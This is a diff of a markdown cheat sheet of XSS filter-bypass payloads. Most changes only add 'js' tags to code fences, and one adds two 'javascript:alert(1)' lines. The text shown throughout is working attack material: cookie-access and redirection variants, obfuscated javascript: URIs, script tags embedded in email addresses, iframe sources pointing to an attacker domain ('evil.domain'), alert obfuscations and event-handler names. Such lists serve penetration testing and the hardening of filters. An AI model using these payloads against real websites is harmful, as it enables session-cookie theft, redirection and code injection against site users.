@@ -1,7 +1,7 @@
 # XSS-Bypass-Filters
 
 ### Redirection
-```
+```js
 document.location=
 document['location']=
 window.location=
@@ -17,14 +17,14 @@ window.open("link", "_blank");
 
 ### Link
 
-```
+```js
 //google.com/?=a
 //134744072:1234/?a= (decimal ip)
 ```
 
 ### Cookies
 
-```
+```js
 document.cookie 
 document['cookie']
 with(document)alert(cookie)
@@ -35,9 +35,10 @@ window["doc"+"ument"]["cookie"]
 
 ### Href
 
-```
+```js
 <!--javascript -->
-
+javascript:alert(1)
+JaVaScript:alert(1)
 javascript	:alert(1) # tab (0x9), newline (0xa) and carriage return (0xd) allowed
 &#x8; &#23;   javascript:alert('Successful XSS')
 ja&Tab;vascript:alert(1)
@@ -73,14 +74,14 @@ javascript:\u0061\u006C\u0065\u0072\u0074``
 ```
 
 ### Email 
-```
+```js
 test+(<script>alert(0)</script>)@example.com
 test@example(<script>alert(0)</script>).com
 "<script>alert(0)</script>"@example.com
 ```
 
 ### Iframe
-```
+```js
 <iframe src="javascript:alert('XSS')"> #use href bypass
 <iframe src="https://youtube.com.evil.domain/ "> # if youtube is whitelisted for example
 <iframe src="https://google.com@evil.domain">
@@ -88,7 +89,7 @@ test@example(<script>alert(0)</script>).com
 ```
 
 ### Alert
-```
+```js
 alert(1)
 window['alert'](0)
 parent['alert'](1)
@@ -122,7 +123,7 @@ Set.constructor`al\x65rt\x2814\x29```;
 ```
 
 ## Events
-```
+```js
 onafterprint
 onafterscriptexecute
 onanimationcancel
